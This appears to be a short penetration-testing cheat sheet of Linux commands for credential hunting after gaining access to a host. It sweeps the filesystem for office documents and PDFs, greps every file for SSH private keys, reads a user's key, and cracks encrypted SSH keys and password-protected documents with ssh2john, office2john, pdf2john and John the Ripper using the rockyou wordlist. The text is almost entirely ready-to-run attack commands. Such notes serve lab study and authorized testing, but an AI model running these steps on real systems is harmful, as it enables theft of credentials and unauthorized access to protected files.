## Hunting for Encoded Files
```bash
for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

## Hunting for SSH keys
```bash
grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

## Encrypted SSH Keys
```bash
cat /home/user/.ssh/SSH.private

# Connvert SSH.private format into a single hash
ssh2john.py SSH.private > ssh.hash

# Crack the hash file
john --wordlist=rockyou.txt ssh.hash
john --show ssh.hash
```

## Cracking Documents
- Some files are password-protected. We need to use John to crack their passwords.
```bash
# Crack the office files
office2john.py Protected.docx > protected-docx.hash
john --wordlist=rockyou.txt protected-docx.hash
john --show protected-docx.hash

# Crack pdfs
pdf2john.py PDF.pdf > pdf.hash
john --wordlist=rockyou.txt pdf.hash
john --show pdf.hash
```
